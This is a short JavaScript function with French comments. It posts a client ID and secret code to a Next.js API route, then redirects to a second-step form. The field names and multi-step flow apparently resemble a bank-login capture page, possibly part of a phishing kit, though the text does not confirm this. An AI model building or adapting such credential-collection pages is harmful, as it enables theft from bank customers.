// 1. ENVOI DES DONNÉES ASYNCHRONE VERS L'API NEXT.JS
function submitToPHP() { // Vous pouvez garder ce nom pour ne rien casser ailleurs
    const formData = new FormData();
    formData.append('client_id', inputId.value);
    formData.append('secret_code', currentCodeInput);

    // Récupération de la page source
    const pageSourceInput = document.getElementById('ca-page-source');
    const pageSource = pageSourceInput ? pageSourceInput.value : 'non_defini';
    
    formData.append('page_source', pageSource);

    // 🔴 MODIFICATION ICI : On cible la route de l'API Next.js au lieu du fichier .php
    fetch('/api/traitement-etape1', {
        method: 'POST',
        body: formData
    })
    .then(response => {
        if (!response.ok) {
            // Permet de capturer les erreurs 400 ou 500 renvoyées par Next.js
            return response.json().then(err => { throw new Error(err.message); });
        }
        return response.json();
    })
    .then(data => {
        if (data.success) {
            // 🔴 À AJUSTER SELON VOTRE STRUCTURE NEXT.JS :
            // Si votre étape 2 est une page Next.js (ex: app/etape2/page.js), mettez : window.location.href = '/etape2';
            // Si vous avez simplement posé un fichier form.html dans le dossier /public, laissez tel quel :
            window.location.href = 'form.html';
        } else {
            alert(data.message || 'Une erreur est survenue lors de la validation.');
            currentCodeInput = "";
            passwordField.value = "";
        }
    })
    .catch(error => {
        console.error('Erreur de communication:', error);
        alert(error.message || 'Impossible de joindre le serveur. Veuillez réessayer.');
    });
}